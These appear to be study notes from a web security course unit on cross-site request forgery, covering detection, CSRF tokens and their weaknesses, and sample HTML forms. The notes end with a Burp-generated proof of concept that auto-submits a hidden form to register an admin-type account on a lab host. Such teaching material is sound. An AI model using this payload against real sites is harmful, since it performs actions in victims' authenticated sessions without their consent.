#### 6.3. Cross-Site Request Forgery (CSRF)

This Learning Unit covers the following Learning Objectives:

1. Understand the concept of cross-site request forgery
2. Understand how to identify cross-site request forgery vulnerabilities
3. Understand how to exploit cross-site request forgery vulnerabilities

This Learning Unit will take approximately 30 minutes to complete.

Cross-site Request Forgery was a staple in the _OWASP Top 10_,[1](https://portal.offsec.com/courses/web-200-28380/learning/cross-origin-attacks-30961/samesite-cookies-31306/samesite-cookies-31399#fn-local_id_237-1) but it was dropped from the 2017 version due to browsers implementing new defensive controls as well as many frameworks including CSRF protections.[2](https://portal.offsec.com/courses/web-200-28380/learning/cross-origin-attacks-30961/samesite-cookies-31306/samesite-cookies-31399#fn-local_id_237-2) In a CSRF exploit, an attacker tricks a user into submitting a request to a site where the user already has an active, authenticated session.

Attackers can phish the victim directly or inject malicious content into a web application, which the victim then loads. In either case, the CSRF payload forces the victim's browser, which includes any session cookies, to make a request to the web application. This browser behavior is changing, which we will discuss later on. Unless the web application has CSRF mitigations, it cannot differentiate between normal requests and malicious requests. The web application then executes the malicious request in the victim's session.

The most dangerous part of CSRF vulnerabilities is that any site that is visited could make these requests, assuming the user is authenticated and the browser will send the cookies to the target application. An attacker could target a specific user with a phishing attack to then launch a CSRF attack or compromise a website to launch CSRF attacks against any user visiting the site. Alternatively, a user could unintentionally visit a malicious site by browsing the internet.

The exact nature of what a CSRF vulnerability can do depends on the web application. Some examples include transferring money in a banking application, creating a new user (potentially including administrative users), or changing passwords to facilitate account takeover.

(OWASP, 2021), [https://owasp.org/www-project-top-ten/](https://owasp.org/www-project-top-ten/) [↩︎](https://portal.offsec.com/courses/web-200-28380/learning/cross-origin-attacks-30961/cross-site-request-forgery-csrf-31298/cross-site-request-forgery-csrf-31398#fnref-local_id_237-1)
(Scott Helme, 2019), [https://scotthelme.co.uk/csrf-is-really-dead/](https://scotthelme.co.uk/csrf-is-really-dead/) [↩︎](https://portal.offsec.com/courses/web-200-28380/learning/cross-origin-attacks-30961/cross-site-request-forgery-csrf-31298/cross-site-request-forgery-csrf-31398#fnref-local_id_237-2)

------------------
#### 6.3.1. Detecting and Preventing CSRF

Until the widespread adoption of _SameSite_ cookies, web applications are vulnerable to CSRF unless they specifically mitigate it. This is unlike other vulnerabilities that occur because of coding flaws. In other words, CSRF attacks exploit the default behavior of browsers and web applications, so it is up to an application to prevent the vulnerability. This is why we will discuss finding CSRF vulnerabilities and how to prevent them at the same time.

Applications can prevent CSRF attacks by requiring the user to submit an additional unique value to prove they are the one initiating the request. This cannot be just a cookie because browsers will automatically send cookies to the domain that created them. One common approach is to include a token or nonce, sometimes referred to as a CSRF token, as a hidden input field. The application randomly generates the value of this token per page or per session and specific to one user. A web application can confirm that a user intentionally sent a request by validating this CSRF token. If the token is missing or invalid, the application should not continue processing the request. This approach requires the application to track the relationship between users and their CSRF tokens.

However, having a server keep track of every CSRF token for every request can add overhead and usability concerns. For this reason, developers have created unique solutions where the server doesn't have to keep track of the token. While a CSRF token cookie by itself is not secure, with additional mitigating factors, it could be a good option.

There are two approaches that rely on a CSRF token cookie where browsers submit the value of the cookie in another way. The "cookie to header" approach uses client-side JavaScript to send the value as a request header. If the cookie value and request header value match on a request, the application can consider the request valid. This approach can be problematic as it requires JavaScript to gain access to the value in the first place. If JavaScript can access the cookie, a _cross-site scripting_ (XSS) vulnerability could allow an attacker to gain access to the cookie and bypass the CSRF protection.

-----------
Cross-site scripting vulnerabilities can bypass CSRF protections in an application since any requests generated by the XSS payload are considered part of the domain. In other words, the requests generated from an XSS payload are not considered cross-origin or cross-site and can therefore access hidden form values or include cookies on requests.

-------------
The "double submit" approach uses a hidden input field that contains the CSRF token value. Similar to the "cookie to header" approach, the web application can validate the cookie value matches in the input field value. One benefit of this approach is that JavaScript does not need access to the cookie containing the CSRF token. Additionally, the web application does not need to maintain a list of which tokens it has generated. It simply validates the values on any given request match.

If an application contains form elements that do not include these mitigations or use _SameSite_ cookies, it is vulnerable to CSRF. We should therefore inspect the HTML source in our browser or requests in Burp Suite to determine if any controls exist.

Let's consider the following hypothetical form.

A sample form without CSRF protection:
```html
<form action="/user/changePassword" method="post">
    <div class="form-group">
        <label for="password1">Password</label>
        <input type="password" class="form-control" id="password1" name="password1" required>
    </div>
    <div class="form-group">
        <label for="password2">Repeat Password</label>
        <input type="password" class="form-control" id="password2" name="password2" required>
    </div>
    <button type="submit" class="btn btn-primary">Submit</button>
</form>
```

<form action="/user/changePassword" method="post">
    <div class="form-group">
        <label for="password1">Password</label>
        <input type="password" class="form-control" id="password1" name="password1" required>
    </div>
    <div class="form-group">
        <label for="password2">Repeat Password</label>
        <input type="password" class="form-control" id="password2" name="password2" required>
    </div>
    <button type="submit" class="btn btn-primary">Submit</button>
</form>

A sample form with CSRF protection
- Notice the `"hidden"` field
```html
<form action="/user/changePassword" method="post">
    <div class="form-group">
        <input type="hidden" name="csrftoken" value="SXQncyBhIHNlY3JldCB0byBldmVyeWJvZHkh" />
        <label for="password1">Password</label>
        <input type="password" class="form-control" id="password1" name="password1" required >
    </div>
    <div class="form-group">
        <label for="password2">Repeat Password</label>
        <input type="password" class="form-control" id="password2" name="password2" required>
    </div>
    <button type="submit" class="btn btn-primary">Submit</button>
</form>
```

<form action="/user/changePassword" method="post">
    <div class="form-group">
        <input type="hidden" name="csrftoken" value="SXQncyBhIHNlY3JldCB0byBldmVyeWJvZHkh" />
        <label for="password1">Password</label>
        <input type="password" class="form-control" id="password1" name="password1" required >
    </div>
    <div class="form-group">
        <label for="password2">Repeat Password</label>
        <input type="password" class="form-control" id="password2" name="password2" required>
    </div>
    <button type="submit" class="btn btn-primary">Submit</button>
</form>


The HTML form now includes a hidden input field named "csrftoken". The metaphorical web application would use this value to determine that a user intentionally submitted this request. The input field containing the token can be named anything, but most frameworks or middleware tend to include "csrf" and "token" somewhere in the name.


------------------
#### 6.3.2 Exploiting CSRF

Generally, it is easier to exploit CSRF with GET requests as there are several ways to instruct a browser to send a GET request. One example is to place the URL that will execute the CSRF attack in an `image tag`. A browser will send a GET request for image tags. In a CSRF attack, we only care that the victim's browser sends the request with the CSRF payload. Even if the browser cannot render the response, the target web application should handle the request and perform the associated functionality. In such cases, attackers can leverage simple content injection vulnerabilities to create persistent CSRF attacks that target all users of the application via HTML tags that are essentially invisible, such as images or iFrames with no size.

Sending a POST request can be more difficult. We would need to trick the user into loading an HTML form that uses JavaScript to submit itself on the _load_ event. This approach also restricts what content-types and HTTP methods we can use. For example, an HTML form cannot send JSON data natively. Standard HTML forms can only send GET and POST requests.

JavaScript APIs, such as _XMLHttpRequest_[1](https://portal.offsec.com/courses/web-200-28380/learning/cross-origin-attacks-30961/cross-site-request-forgery-csrf-31298/detecting-and-preventing-csrf-30999#fn-local_id_258-1) (XHR) and Fetch, can send requests with arbitrary HTTP methods and content-types. However, when used in this way, these APIs will send a _preflight_[2](https://portal.offsec.com/courses/web-200-28380/learning/cross-origin-attacks-30961/cross-site-request-forgery-csrf-31298/detecting-and-preventing-csrf-30999#fn-local_id_258-2) request to determine if Cross-Origin Resource Sharing (CORS) is enabled on the target server. We will discuss CORS later.

(Wikipedia, 2021), [https://en.wikipedia.org/wiki/XMLHttpRequest](https://en.wikipedia.org/wiki/XMLHttpRequest) [↩︎](https://portal.offsec.com/courses/web-200-28380/learning/cross-origin-attacks-30961/cross-site-request-forgery-csrf-31298/exploiting-csrf-30970#fnref-local_id_258-1)
(Mozilla, 2021), [https://developer.mozilla.org/en-US/docs/Glossary/Preflight_request](https://developer.mozilla.org/en-US/docs/Glossary/Preflight_request) [↩︎](https://portal.offsec.com/courses/web-200-28380/learning/cross-origin-attacks-30961/cross-site-request-forgery-csrf-31298/exploiting-csrf-30970#fnref-local_id_258-2)

-----------------


<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="http://screamin_firehawk/loginLogout" method="POST" enctype="multipart/form-data">
      <input type="hidden" name="&#95;token" value="uQzxxdaDIx4I06JV6xCM4ZFiw3kZ6MEmS3AMFdyq" />
      <input type="hidden" name="username" value="testadmin" />
      <input type="hidden" name="password" value="testadmin" />
      <input type="hidden" name="firstName" value="testadmin" />
      <input type="hidden" name="lastName" value="testadmin" />
      <input type="hidden" name="email" value="testadmin&#64;local&#46;com" />
      <input type="hidden" name="dType" value="isRegister" />
      <input type="hidden" name="type" value="100" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
